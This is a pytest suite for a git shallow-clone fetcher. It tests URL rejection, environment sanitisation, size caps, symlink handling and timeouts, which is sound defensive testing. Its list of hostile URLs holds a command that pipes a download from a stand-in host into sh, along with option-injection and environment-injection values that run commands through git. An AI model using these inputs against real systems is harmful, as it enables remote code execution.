import os
import subprocess
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest

from analyzer.fetcher.clone import (
    CloneTooLarge,
    UnsupportedRepositoryURL,
    shallow_clone,
)


def _init_and_commit(repo: Path) -> str:
    """Initialise a repo, commit whatever is already in it, return the sha."""
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=repo, check=True)
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
    subprocess.run(
        ["git", "-c", "user.email=t@example.com", "-c", "user.name=t",
         "commit", "-q", "-m", "initial"],
        cwd=repo, check=True,
    )
    return subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo,
        capture_output=True, text=True, check=True,
    ).stdout.strip()


@pytest.fixture
def origin_repo(tmp_path: Path) -> tuple[Path, str]:
    """A real local git repository, so that no test touches the network."""
    repo = tmp_path / "origin"
    repo.mkdir()
    (repo / "server.py").write_text("print('hello')\n", encoding="utf-8")
    return repo, _init_and_commit(repo)


def _url(repo: Path) -> str:
    """file:// forces git's normal transport, so --depth behaves as it would
    against a remote rather than taking the local-path shortcut."""
    return f"file://{repo}"

HOSTILE_URLS = [
    "ext::sh -c 'curl evil.example/x | sh'",  # git's ext transport runs a command
    "ext::touch /tmp/pwned",
    "ssh://git@example.com/repo.git",  # would use GIT_SSH_COMMAND
    "git://example.com/repo.git",  # unauthenticated, and GIT_PROXY_COMMAND runs
    "http://example.com/repo.git",  # plaintext
    "--upload-pack=touch /tmp/pwned",  # a URL that reads as an option
    "git@github.com:owner/repo.git",  # scp syntax, implicitly ssh
    "",
]


@pytest.mark.parametrize("repo_url", HOSTILE_URLS)
def test_unsupported_url_is_rejected_before_any_subprocess_starts(
    repo_url: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The URL reaches us from a third-party registry, so it is hostile input.

    Rejection must happen before git is invoked, not inside it. Git config
    hardening cannot be relied on here: the legacy GIT_ALLOW_PROTOCOL
    environment variable overrides `-c protocol.ext.allow=never`, so an
    environment we do not control can re-enable a transport that executes
    arbitrary commands. Refusing the URL outright is the defence that holds
    regardless of the environment.
    """

    def forbidden(*args: Any, **kwargs: Any) -> Any:
        raise AssertionError(f"a subprocess was started for {repo_url!r}")

    monkeypatch.setattr(subprocess, "run", forbidden)
    monkeypatch.setattr(subprocess, "Popen", forbidden)

    with pytest.raises(UnsupportedRepositoryURL):
        shallow_clone(repo_url, tmp_path / "work")


def test_clone_returns_the_files_and_the_commit_it_fetched(
    origin_repo: tuple[Path, str], tmp_path: Path
) -> None:
    """The fetcher reports the commit it actually got rather than being told one.

    Fetching a caller-supplied SHA needs the remote to allow it, which is not
    universal. Recording what arrived is equally reproducible and depends on
    nothing the server has to opt into.
    """
    repo, expected_sha = origin_repo

    result = shallow_clone(_url(repo), tmp_path / "work")

    assert (result.path / "server.py").read_text(encoding="utf-8") == "print('hello')\n"
    assert result.commit_sha == expected_sha


def _first_word(cmd: object) -> str:
    """os.system takes a string; subprocess takes a sequence."""
    if isinstance(cmd, str):
        return cmd.split()[0]
    assert isinstance(cmd, (list, tuple))
    return str(cmd[0])


def test_fetcher_invokes_git_and_nothing_else(
    origin_repo: tuple[Path, str], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The project's central invariant, tested rather than asserted in a comment.

    Delegating spies rather than blockers: subprocess.run resolves Popen through
    the module global, so replacing Popen with a raiser would break run() itself
    and the test would pass for the wrong reason.
    """
    repo, _ = origin_repo
    invoked: list[object] = []

    def spy(real: Callable[..., Any]) -> Callable[..., Any]:
        def wrapper(cmd: Any, *args: Any, **kwargs: Any) -> Any:
            invoked.append(cmd)
            return real(cmd, *args, **kwargs)

        return wrapper

    monkeypatch.setattr(subprocess, "run", spy(subprocess.run))
    monkeypatch.setattr(subprocess, "Popen", spy(subprocess.Popen))
    monkeypatch.setattr(os, "system", spy(os.system))

    shallow_clone(_url(repo), tmp_path / "work")

    assert invoked, "expected at least one subprocess call"
    assert all(_first_word(cmd) == "git" for cmd in invoked), invoked


def test_git_is_handed_a_constructed_environment_not_an_inherited_one(
    origin_repo: tuple[Path, str], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Config hardening alone does not hold, so the environment is controlled.

    Verified directly against git 2.39: with GIT_ALLOW_PROTOCOL=ext set, an
    `ext::` remote executes its command *even with* `-c protocol.ext.allow=never`
    on the command line. The legacy variable wins. Unsetting it for the child
    blocks the execution, so the environment git receives has to be one we
    build rather than one it inherits.
    """
    # "ext:file" rather than "ext": the variable is an allowlist, so naming
    # only ext would block file:// and the clone would fail for an unrelated
    # reason before reaching the assertion.
    monkeypatch.setenv("GIT_ALLOW_PROTOCOL", "ext:file")
    monkeypatch.setenv("GIT_SSH_COMMAND", "touch /tmp/should-never-run")
    # A valid env-based config injection, not a malformed one: git accepts
    # these and applies them, which is precisely why inheriting is unsafe.
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "core.pager")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", "touch /tmp/should-never-run")

    seen: list[object] = []
    real_run = subprocess.run

    def spy(cmd: Any, *args: Any, **kwargs: Any) -> Any:
        seen.append(kwargs.get("env"))
        return real_run(cmd, *args, **kwargs)

    monkeypatch.setattr(subprocess, "run", spy)
    repo, _ = origin_repo

    shallow_clone(_url(repo), tmp_path / "work")

    assert seen, "expected at least one git invocation"
    for env in seen:
        assert env is not None, "git inherited the ambient environment"
        assert isinstance(env, dict)
        assert "GIT_ALLOW_PROTOCOL" not in env
        assert "GIT_SSH_COMMAND" not in env
        assert "GIT_CONFIG_COUNT" not in env
        assert "GIT_CONFIG_KEY_0" not in env


def test_clone_rejects_a_repository_over_the_file_cap(
    origin_repo: tuple[Path, str], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo, _ = origin_repo
    monkeypatch.setattr("analyzer.fetcher.clone.MAX_FILES", 0)

    with pytest.raises(CloneTooLarge, match="files"):
        shallow_clone(_url(repo), tmp_path / "work")


def test_clone_rejects_a_repository_over_the_byte_cap(
    origin_repo: tuple[Path, str], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Matches on "fetched" to pin the pre-checkout check specifically.

    The post-checkout walk also raises a message containing "bytes", so a looser
    match would still pass if someone moved the check back after checkout and
    reintroduced the second copy on disk.
    """
    repo, _ = origin_repo
    monkeypatch.setattr("analyzer.fetcher.clone.MAX_BYTES", 0)

    with pytest.raises(CloneTooLarge, match="fetched"):
        shallow_clone(_url(repo), tmp_path / "work")


def test_symlinks_are_not_followed_when_measuring_a_clone(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A repository may legally contain a symlink pointing outside itself.

    Following it counts a file we do not control toward the size of a
    repository we are measuring, and lets a hostile repository aim our
    traversal at anything readable on the host. Merely wrong for a byte total,
    but the same walk reappears in the scanner, which reads file *contents*
    into evidence that gets published. That is the route by which somebody's
    private key ends up quoted in a public report.
    """
    outside = tmp_path / "outside.bin"
    outside.write_bytes(b"x" * 200_000)

    repo = tmp_path / "origin"
    repo.mkdir()
    (repo / "server.py").write_text("x = 1\n", encoding="utf-8")
    (repo / "escape").symlink_to(outside)
    _init_and_commit(repo)

    # A 200 KB target against a 100 KB cap: following the link blows it, and
    # the repository's own content is six bytes.
    monkeypatch.setattr("analyzer.fetcher.clone.MAX_BYTES", 100_000)

    result = shallow_clone(_url(repo), tmp_path / "work")

    assert (result.path / "escape").is_symlink(), "the symlink should survive the clone"
    assert result.commit_sha


def test_the_timeout_is_applied_to_every_git_invocation(
    origin_repo: tuple[Path, str], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Tested as plumbing, not with a genuinely slow clone.

    A test that waits for a real timeout is slow and flaky, and a slow flaky
    test gets deleted within a month. Asserting that the value reaches every
    invocation catches the failure that actually happens: a new git call added
    later without it, which would hang a nightly run on one unresponsive host.
    """
    repo, _ = origin_repo
    timeouts: list[object] = []
    real_run = subprocess.run

    def spy(cmd: Any, *args: Any, **kwargs: Any) -> Any:
        timeouts.append(kwargs.get("timeout"))
        return real_run(cmd, *args, **kwargs)

    monkeypatch.setattr(subprocess, "run", spy)

    shallow_clone(_url(repo), tmp_path / "work", timeout_s=37)

    assert timeouts, "expected at least one git invocation"
    assert set(timeouts) == {37}, timeouts
